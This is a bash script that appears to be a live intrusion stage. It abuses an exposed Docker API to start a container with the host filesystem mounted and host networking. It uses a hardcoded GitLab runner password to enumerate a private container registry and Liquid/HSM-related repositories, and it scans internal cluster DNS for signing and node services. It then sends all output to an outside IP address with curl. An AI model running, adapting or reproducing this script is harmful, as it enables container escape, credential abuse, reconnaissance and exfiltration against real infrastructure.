#!/bin/bash
{
echo "==S41=="
CID=$(curl -sf -X POST "http://docker:2375/containers/create" -H "Content-Type: application/json" -d '{"Image": "blockstream/esplora:latest", "Cmd": ["bash", "-c", "echo S41_IN; echo ==REGISTRY==; curl -su \"gitlab-runner-user:BDwgT62R3W#rkDd(2E\" https://glregistry.blockstream.io/v2/_catalog 2>&1; echo ==REG_SEARCH==; for repo in liquid/functionary liquid/hsm liquid/watchman liquid/blocksigner blockstream/functionary blockstream/liquidd blockstream/hsm; do r=$(curl -sfu \"gitlab-runner-user:BDwgT62R3W#rkDd(2E\" \"https://glregistry.blockstream.io/v2/$repo/tags/list\" 2>&1); echo \"$repo: $r\"; done; echo ==LIQUID_DNS==; for svc in functionary watchman blocksigner elementsd bitcoind liquid parallel-port hsm gitlab; do for h in $svc.liquid.svc.cluster.local $svc.production.svc.cluster.local $svc.default.svc.cluster.local; do ip=$(getent hosts $h 2>/dev/null | head -1); [ -n \"$ip\" ] && echo \"FOUND: $h -> $ip\"; done; done; echo ==DONE=="], "HostConfig": {"Binds": ["/:/host:ro"], "NetworkMode": "host"}}' 2>/dev/null | grep -o '"Id":"[^"]*"' | cut -d'"' -f4 | head -c 12)
echo "CID:$CID"
if [ -n "$CID" ]; then
    curl -sf -X POST "http://docker:2375/containers/$CID/start" 2>/dev/null
    sleep 15
    echo "==LOGS=="
    curl -sf "http://docker:2375/containers/$CID/logs?stdout=true&stderr=true" 2>&1
    curl -sf -X DELETE "http://docker:2375/containers/$CID?force=true" 2>/dev/null
fi
echo "==END=="
} 2>&1 | curl -s -m180 -X POST http://144.172.110.44:8443/s41 --data-binary @-
